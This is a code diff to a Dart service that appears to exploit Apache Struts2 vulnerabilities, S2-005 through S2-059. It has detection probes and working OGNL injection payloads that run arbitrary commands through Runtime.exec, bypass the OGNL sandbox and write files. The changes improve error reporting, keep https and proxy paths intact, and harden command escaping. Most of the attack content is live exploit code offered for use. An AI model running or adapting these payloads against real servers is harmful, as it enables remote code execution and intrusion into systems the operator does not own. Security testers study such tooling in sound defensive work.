@@ -4,6 +4,7 @@ import 'dart:math' as math;
 import 'package:http/http.dart' as http;
 
 import 'services/exp_result.dart';
+import 'services/rce_encoder.dart';
 
 enum Struts2VulnType {
   s2032('S2-032 (CVE-2016-3081, Struts 2.3.20-2.3.28)', 'DMI 方法 OGNL 注入'),
@@ -66,7 +67,8 @@ class Struts2ExpService {
           'Content-Type OGNL 注入，响应体含标记值 $marker',
         );
       }
-    } catch (_) {
+    } catch (e) {
+      return ExpResult.probeFailed('S2-045 (CVE-2017-5638)', '探测失败: $e');
     } finally {
       client.close();
     }
@@ -86,7 +88,9 @@ class Struts2ExpService {
           'DMI 方法 OGNL 注入，验证通过',
         );
       }
-    } catch (_) {}
+    } catch (e) {
+      return ExpResult.probeFailed('S2-032 (CVE-2016-3081)', '探测失败: $e');
+    }
     return ExpResult(false, 'S2-032 (CVE-2016-3081)', '');
   }
 
@@ -112,7 +116,9 @@ class Struts2ExpService {
           'Freemarker 二次 OGNL 注入，数学运算验证通过 (233*233=54289)',
         );
       }
-    } catch (_) {}
+    } catch (e) {
+      return ExpResult.probeFailed('S2-053', '探测失败: $e');
+    }
     return ExpResult(false, 'S2-053', '');
   }
 
@@ -164,8 +170,8 @@ class Struts2ExpService {
   // 漏洞触发时 OGNL 表达式求值结果出现在 Location 响应头，而非响应体
   Future<ExpResult> checkS2057({String path = 'struts2-showcase'}) async {
     try {
-      final detectUrl =
-          'http://${baseUri.host}:${baseUri.port}/$path/%24%7b233*233%7d/actionChain1.action';
+      // 用 baseUri 拼装：保留 https、非默认端口与反向代理的前缀路径。
+      final detectUrl = '${baseUri}$path/%24%7b233*233%7d/actionChain1.action';
       final request = http.Request('GET', Uri.parse(detectUrl));
       request.followRedirects = false;
       final client = http.Client();
@@ -182,7 +188,9 @@ class Struts2ExpService {
       } finally {
         client.close();
       }
-    } catch (_) {}
+    } catch (e) {
+      return ExpResult.probeFailed('S2-057 (CVE-2018-11776)', '探测失败: $e');
+    }
     return ExpResult(false, 'S2-057 (CVE-2018-11776)', '');
   }
 
@@ -204,7 +212,9 @@ class Struts2ExpService {
           '标签属性二次 OGNL 求值，数学运算验证通过',
         );
       }
-    } catch (_) {}
+    } catch (e) {
+      return ExpResult.probeFailed('S2-059 (CVE-2019-0230)', '探测失败: $e');
+    }
     return ExpResult(false, 'S2-059 (CVE-2019-0230)', '');
   }
 
@@ -313,8 +323,10 @@ class Struts2ExpService {
           );
         }
       }
-    } catch (_) {}
-    return const ExpResult(false, 'S2-005 (CVE-2010-1870)', '');
+    } catch (e) {
+      return ExpResult.probeFailed('S2-005 (CVE-2010-1870)', '探测失败: $e');
+    }
+    return ExpResult(false, 'S2-005 (CVE-2010-1870)', '');
   }
 
   // ── S2-007 ──────────────────────────────────────────────────────────────────
@@ -347,8 +359,10 @@ class Struts2ExpService {
           '类型转换 OGNL 注入，233×233=54289 已出现在响应体',
         );
       }
-    } catch (_) {}
-    return const ExpResult(false, 'S2-007', '');
+    } catch (e) {
+      return ExpResult.probeFailed('S2-007', '探测失败: $e');
+    }
+    return ExpResult(false, 'S2-007', '');
   }
 
   // ── S2-052 ──────────────────────────────────────────────────────────────────
@@ -374,8 +388,10 @@ class Struts2ExpService {
           'REST Plugin 端点可达 (HTTP ${res.statusCode})，XStream 反序列化可能存在',
         );
       }
-    } catch (_) {}
-    return const ExpResult(false, 'S2-052', '');
+    } catch (e) {
+      return ExpResult.probeFailed('S2-052', '探测失败: $e');
+    }
+    return ExpResult(false, 'S2-052', '');
   }
 
   Future<ExpResult> checkSingle(
@@ -480,8 +496,7 @@ class Struts2ExpService {
           ".(#a=@java.lang.Runtime@getRuntime().exec('$escapedCmd'))"
           ".(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}";
       final encodedOgnl = Uri.encodeComponent(ognl);
-      final url =
-          'http://${baseUri.host}:${baseUri.port}/$path/$encodedOgnl/actionChain1.action';
+      final url = '${baseUri}$path/$encodedOgnl/actionChain1.action';
 
       final request = http.Request('GET', Uri.parse(url));
       request.followRedirects = false;
@@ -531,7 +546,7 @@ class Struts2ExpService {
           '.(#ou.setExcludedPackageNames(""))'
           '.(#vs.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))';
       final exec =
-          '.(#proc=@java.lang.Runtime@getRuntime().exec("${cmd.replaceAll('"', '\\"')}"))'
+          '.(#proc=@java.lang.Runtime@getRuntime().exec("${RceEncoder.escapeDoubleQuoted(cmd)}"))'
           '.(new java.io.BufferedReader(new java.io.InputStreamReader(#proc.getInputStream())).readLine())';
       final ognl = '%{$bypass$exec}';
       final res = await http
@@ -889,8 +904,7 @@ class Struts2ExpService {
           '.(#ct.setMemberAccess(#dm))'
           '$write}';
       final encodedOgnl = Uri.encodeComponent(ognl);
-      final url =
-          'http://${baseUri.host}:${baseUri.port}/$path/$encodedOgnl/actionChain1.action';
+      final url = '${baseUri}$path/$encodedOgnl/actionChain1.action';
       final req = http.Request('GET', Uri.parse(url));
       req.followRedirects = false;
       final client = http.Client();
